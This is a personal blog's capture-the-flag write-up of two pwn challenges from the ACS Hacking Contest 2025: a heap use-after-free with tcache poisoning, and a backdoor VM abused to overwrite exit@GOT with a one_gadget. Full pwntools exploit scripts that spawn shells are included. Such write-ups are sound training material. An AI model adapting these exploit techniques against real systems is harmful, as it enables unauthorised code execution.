---
layout: post
title: "ACS 2025"
categories: pwn
tags: pwn
---

Hey there!
Welcome back to my writeup blog. Today I’m covering some of the pwn challenges I solved at the ACS Hacking Contest 2025 in Busan, South Korea. It was an amazing experience — we finished in 2nd place and received a cash prize. 

![ACS Awarding](/assets/images/acs2025.jpg)

I won’t cover every challenge here~.

# Urgents Echos of the City

- **Category:** Pwn / Heap
- **Files Provided:** `urgent` (ELF), remote service

This challenge revolves around a buggy memo system managing heap chunks inside plate entries, a separate locked control core, and an override mechanism that calls a function pointer. The goal is to overwrite `ctrl->override_handler` with `emergency_override`, then trigger it to spawn `/bin/sh`.

## Vulnerabilities

### 1) Use-after-free on memo
`clear_memo()` frees `e->note` but does not null the pointer nor reset `e->note_size`:

```c
static void clear_memo(void) {
  int idx = select_slot();
  if (idx < 0) {
    return;
  }

  plate_entry *e = registry[idx];
  if (!e->note) {
    puts("Memo already cleared.");
    return;
  }

  free(e->note);
  puts("Memo cleared to conserve memory.");
}
```

Later, `edit_memo()` and `show_memo()` trust `e->note`/`e->note_size` and perform UAF read/write:

```c
static void edit_memo(void) {
  int idx = select_slot();
  ...
  plate_entry *e = registry[idx];
  if (!e->note_size) {
    puts("No memo allocated for this entry.");
    return;
  }

  printf("Update memo (%zu bytes max): ", e->note_size);
  if (read(0, e->note, e->note_size) <= 0) { // UAF write
    puts("Update failed.");
    exit(1);
  }

  puts("Memo updated.");
}

static void show_memo(void) {
  int idx = select_slot();
  ...
  plate_entry *e = registry[idx];
  if (!e->note) {
    puts("Memo already cleared.");
    return;
  }

  printf("--- Memo for %s ---\n", e->plate_id);
  if (write(1, e->note, e->note_size) <= 0) { // UAF read
    puts("[!] Transmission error.");
  }
  puts("\n------------------------");
}
```

After `free(e->note)`, the chunk goes into tcache and can be reused later. Because the code keeps writing to `e->note`, we can still modify that freed chunk—including its `fd` pointer—giving us exactly the primitive we need to poison tcache. Reads may show stale or unrelated data, but the key benefit is the write into freed memory.

### 2) Locked slot bypass
`select_slot()` blocks slot 7 (SYS-CNTL), but `trigger_override()` does not use it and directly reads the index, allowing slot 7:

```c
unsigned long idx = read_u64();
if (idx >= MAX_PLATES || !registry[idx]) {
  puts("Invalid slot.");
  return;
}
plate_entry *e = registry[idx];
// no lock check here
ctrl->override_handler(e->plate_id);
```

## Goal
- Arbitrary write to `ctrl->override_handler` with the address of `emergency_override`.
- Trigger `trigger_override(7)` → `/bin/sh`.

## Steps
1. Leak `ctrl` and `log_alert` via the menu leaks; compute binary base and `emergency_override`.
2. Allocate two memos of the same size (e.g., 56) so their frees populate the same tcache bin.
3. Free both; the latest freed becomes the tcache head.
4. UAF-write the head chunk’s `fd` with the safe-linking encoded target `&ctrl->override_handler` (`fd = (chunk_addr >> 12) ^ next`).
5. Perform two `malloc(56)` via registering vehicles; the second returns our target pointer as the memo buffer.
6. Edit that memo to `p64(emergency_override)`.
7. Trigger override on slot 7 to get a shell.

## Visualizing tcache poisoning
- Before poisoning: `tcache_head -> memo1 -> memo0 -> ...`
- UAF-write `memo1->fd = encode(&ctrl->override_handler)`.
- First `malloc(56)`: returns `memo1`, new head becomes decoded `&ctrl->override_handler`.
- Second `malloc(56)`: returns `&ctrl->override_handler` as the “chunk”. We now control writes there.

## Detailed Walkthrough
Putting it all together: we start by using the built-in debug menus to leak two values — the heap address of `ctrl` (via slot 7’s `memo=`) and the current handler pointer (via analytics). Because the binary is non-PIE and ships symbols, subtracting the static offset of `log_alert` from the handler leak yields the module base. Adding the static offset of `emergency_override` gives the absolute address we want to write. With `ctrl` in hand, we compute `&ctrl->override_handler` by adding its known offset inside the struct.

Next, we craft the heap state. Two same-size memo allocations guarantee that freeing them places both chunks into the same tcache bin. Freeing in order (older first, newer last) makes the last-freed chunk the head, which is returned first by `malloc`. Thanks to the use-after-free, we can still edit that head chunk’s contents; glibc safe-linking requires the forward pointer to be encoded as `(chunk_addr >> 12) ^ target`. Writing that value into the freed chunk’s `fd` plants our target pointer (`&ctrl->override_handler`) into the tcache list.

When we allocate twice, the first `malloc` pops the poisoned chunk and sets the tcache head to our decoded target address. The second `malloc` returns that address as if it were a regular heap chunk and wires it up as the memo buffer for a new slot. Editing the memo now writes directly into `ctrl->override_handler`, so we store `p64(emergency_override)`. Finally, invoking `trigger_override(7)` calls our new handler with slot 7’s plate ID, and the challenge drops us into `/bin/sh`.

## Solver

```python
#!/usr/bin/env python3
from pwn import *
import re

BIN = "./urgent"

elf = ELF(BIN)
context.binary = elf
# context.log_level = "debug"


def start():
  if args.REMOTE:
    return remote("10.100.0.11", 30006)
  else:
    return process(BIN)


def menu_choice(io, num):
  io.sendlineafter(b">> ", str(num).encode())


def list_registry(io):
  menu_choice(io, 6)
  out = io.recvuntil(b"\n\n", drop=True)
  log.info("=== list_registry ===")
  log.info(out.decode(errors="ignore"))
  return out


def analytics(io):
  menu_choice(io, 7)
  io.recvuntil(b"City node: ")
  city = io.recvline().strip()
  io.recvuntil(b"Override handler @ ")
  handler = int(io.recvline().strip(), 16)
  io.recvuntil(b"Override count: ")
  count = int(io.recvline().strip())
  log.info(f"City   : {city}")
  log.info(f"Handler: {hex(handler)}")
  log.info(f"Count  : {count}")
  return handler, count


def leak_ctrl_and_handler(io):
  out = list_registry(io)
  ctrl_addr = None
  for line in out.splitlines():
    if line.startswith(b"[7]"):
      m = re.search(rb"memo=(0x[0-9a-fA-F]+)", line)
      if m:
        ctrl_addr = int(m.group(1), 16)
  if ctrl_addr is None:
    log.error("Failed to get ctrl")
    log.info(out.decode(errors="ignore"))
    raise SystemExit

  log.success(f"ctrl @ {hex(ctrl_addr)}")

  handler, _ = analytics(io)
  log.success(f"override_handler (log_alert) @ {hex(handler)}")
  return ctrl_addr, handler


def calc_addresses(ctrl_addr, log_alert_leak):
  log_alert_off = elf.sym["log_alert"]
  emergency_off = elf.sym["emergency_override"]

  base = log_alert_leak - log_alert_off
  emergency_addr = base + emergency_off
  override_handler_ptr_addr = ctrl_addr + 0x20

  log.success(f"PIE base                    = {hex(base)}")
  log.success(f"emergency_override          = {hex(emergency_addr)}")
  log.success(f"&ctrl->override_handler     = {hex(override_handler_ptr_addr)}")

  return emergency_addr, override_handler_ptr_addr


def register_vehicle(io, plate, category, memo_size, memo_data):
  menu_choice(io, 1)
  io.sendafter(b"License plate (max 15 chars): ", plate + b"\n")
  io.sendafter(
    b"Vehicle category (AMBULANCE/EMS/etc, max 15 chars): ",
    category + b"\n",
  )
  io.sendafter(b"Memo size (32-32768): ", str(memo_size).encode() + b"\n")
  assert len(memo_data) == memo_size
  io.sendafter(b"Describe the intersection plan: ", memo_data)


def clear_memo(io, idx):
  menu_choice(io, 4)
  io.sendlineafter(b"Select slot (0-7): ", str(idx).encode())


def edit_memo_exact(io, idx, data, size):
  assert len(data) <= size
  menu_choice(io, 2)
  io.sendlineafter(b"Select slot (0-7): ", str(idx).encode())
  io.recvuntil(b"bytes max): ")
  io.send(data.ljust(size, b"\x00"))


def pwn():
  io = start()

  # 1) Leak ctrl & handler
  ctrl_addr, log_alert_leak = leak_ctrl_and_handler(io)
  emergency_addr, override_handler_ptr_addr = calc_addresses(ctrl_addr, log_alert_leak)

  # 2) Two memos of same tcache bin size (56)
  memo_size = 56
  register_vehicle(io, b"A", b"A", memo_size, b"A" * memo_size)  # slot 0
  register_vehicle(io, b"B", b"B", memo_size, b"B" * memo_size)  # slot 1

  out = list_registry(io)
  memo0 = memo1 = None
  for line in out.splitlines():
    if line.startswith(b"[0]"):
      m = re.search(rb"memo=(0x[0-9a-fA-F]+)", line)
      if m:
        memo0 = int(m.group(1), 16)
    if line.startswith(b"[1]"):
      m = re.search(rb"memo=(0x[0-9a-fA-F]+)", line)
      if m:
        memo1 = int(m.group(1), 16)

  if memo0 is None or memo1 is None:
    log.error("Failed to get memo0/memo1")
    log.info(out.decode(errors="ignore"))
    raise SystemExit

  # 3) Free both (order matters)
  clear_memo(io, 0)  # free memo0
  clear_memo(io, 1)  # free memo1 -> tcache head

  # 4) Poison head using safe-linking formula
  poison_fd = (memo1 >> 12) ^ override_handler_ptr_addr
  edit_memo_exact(io, 1, p64(poison_fd), memo_size)  # UAF write into freed memo1

  # 5) Two malloc(56) -> second returns &ctrl->override_handler
  register_vehicle(io, b"C", b"C", memo_size, b"C" * memo_size)  # slot 2
  register_vehicle(io, b"D", b"D", memo_size, b"D" * memo_size)  # slot 3

  out = list_registry(io)
  target_slot = None
  for line in out.splitlines():
    m = re.search(rb"\[(\d)\].*memo=(0x[0-9a-fA-F]+)", line)
    if m:
      idx = int(m.group(1))
      memo_addr = int(m.group(2), 16)
      if memo_addr == override_handler_ptr_addr:
        target_slot = idx

  if target_slot is None:
    log.error("Did not find slot whose memo == &ctrl->override_handler")
    raise SystemExit

  # 6) Overwrite handler to emergency_override
  edit_memo_exact(io, target_slot, p64(emergency_addr), 8)

  new_handler, _ = analytics(io)
  if new_handler != emergency_addr:
    log.warning("Handler did NOT change to emergency_override!")
  else:
    log.success("Handler successfully overwritten to emergency_override!")

  # 7) Trigger override -> shell
  menu_choice(io, 5)
  io.sendlineafter(b"Select slot (0-7): ", b"7")
  io.interactive()


if __name__ == "__main__":
  pwn()
```

![Solver](/assets/images/acs-pwn-1.png)

<br>

---

<br>  

# Step5_Kill_switch

- **Category:** Pwn / VM
- **Files Provided:** `backdoor` (ELF), `Dockerfile`

This challenge looked like a custom exfiltration protocol at first glance, but the intended path is actually to "fail" the handshake. When the server doesn’t see the correct `"HELLO"` pattern (after XOR 0x42), it diverts execution into a backdoor bytecode VM implemented in `sub_4024C0`. That VM reads attacker-controlled data, XOR-decodes it with 0x42, stores it at offset 0x20 of a large context structure, and then interprets it as instructions via a custom dispatch table.

By reversing the dispatch table, we can recover a small but powerful instruction set. The key opcodes (after de-XOR) are:
- `0x93 reg imm64` — load a 64-bit immediate constant into a VM register.
- `0x75 dst src` — double-pointer dereference: `reg[dst] = * ( *(uint64_t**)reg[src] )` (arbitrary read primitive).
- `0x74 dst src` — double-pointer store: `*(*(uint64_t**)reg[dst]) = reg[src]` (arbitrary write primitive).
- `0x85 arg` with `arg = 0xDE` — send 8 bytes starting from pointer in `reg0` back over the network (leak primitive).
- `0x9E` — halt the VM and return to the normal code path.

The VM runs in a forked child where `dup2(fd, 0/1/2)` has already been called, so any code execution in the child immediately becomes an interactive shell over the same socket. The only missing piece is a way to pivot our arbitrary read/write into a reliable libc-based RCE.

Because the main binary is non-PIE, the GOT lives at fixed addresses. We can hard-code `recv@GOT`, and that entry is already resolved by the time the VM executes, unlike `free@GOT` which may still point into the PLT stub. The plan is:
1. Use the VM to leak `recv@GOT` → `recv@libc`.
2. Derive the libc base from that leak.
3. Pick a convenient `one_gadget` inside libc (an `execve("/bin/sh", ...)`-style gadget) and compute its absolute address.
4. Use the VM’s arbitrary write to patch `exit@GOT` with that one-gadget address.
5. Halt the VM and let the child process call `exit(0)`, which now jumps directly into the one gadget and gives us a shell.


## Solver

Below is the exploit script that implements this plan using pwntools. It assembles the VM bytecode with helper functions, XOR-encodes it with 0x42 to match the backdoor’s decoding logic, leaks `recv@libc`, computes libc base and the chosen `one_gadget`, then patches `exit@GOT` and drops into an interactive shell.

```python
#!/usr/bin/env python3
from pwn import *


HOST = "10.100.0.11"
PORT = 30008

BIN_PATH = "./backdoor"
LIBC_PATH = "./libc.so.6"

ONE_GADGET_OFFSET = 0xebc81 

context.binary = ELF(BIN_PATH)
elf = context.binary
libc = ELF(LIBC_PATH)
context.log_level = "info"

OP_SET_IMM   = 0x93
OP_SET_PTR   = 0x94
OP_LOAD_DBL  = 0x75
OP_STORE_DBL = 0x74
OP_IO        = 0x85
OP_HALT      = 0x9E

def xor_encode(b: bytes, key=0x42) -> bytes:
  return bytes(x ^ key for x in b)

def build_set_imm(reg: int, val: int) -> bytes:
  return bytes([OP_SET_IMM, reg]) + p64(val)

def build_load_dbl(dst: int, src: int) -> bytes:
  return bytes([OP_LOAD_DBL, dst, src])

def build_store_dbl(dst: int, src: int) -> bytes:
  return bytes([OP_STORE_DBL, dst, src])

def build_io(arg: int) -> bytes:
  return bytes([OP_IO, arg])

def build_halt() -> bytes:
  return bytes([OP_HALT])

def leak_recv_addr():
  recv_got = elf.got["recv"]
  log.info(f"recv@GOT = {hex(recv_got)}")

  code  = b""
  code += build_set_imm(2, recv_got)
  code += build_load_dbl(0, 2)
  code += build_io(0xDE)
  code += build_halt()

  payload = xor_encode(code)

  io = remote(HOST, PORT)
  io.send(payload)
  data = io.recvn(8)
  recv_addr = u64(data)
  log.success(f"Leaked recv@libc = {hex(recv_addr)}")
  io.close()
  return recv_addr

def patch_exit(one_gadget_addr):
  exit_got = elf.got["exit"]
  log.info(f"exit@GOT = {hex(exit_got)}")
  log.info(f"one_gadget = {hex(one_gadget_addr)}")

  code  = b""
  code += build_set_imm(1, one_gadget_addr)
  code += build_set_imm(2, exit_got)
  code += build_store_dbl(2, 1)
  code += build_halt()

  payload = xor_encode(code)

  io = remote(HOST, PORT)
  io.send(payload)
  log.info("patch_exit payload sent, waiting for shell...")
  io.interactive()

def main():
  recv_addr = leak_recv_addr()
  libc.address = recv_addr - libc.sym["recv"]
  log.success(f"libc base = {hex(libc.address)}")

  one_gadget = libc.address + ONE_GADGET_OFFSET
  log.info(f"Calculated one_gadget address = {hex(one_gadget)}")

  patch_exit(one_gadget)

if __name__ == "__main__":
  main()
```

![Solver](/assets/images/acs-pwn-2.png)

<br>

---

<br>  

So much fun playing pwn in the ACS. Oso I really enjoy Busan with the cold weather (it almost winter tho...)

<br>
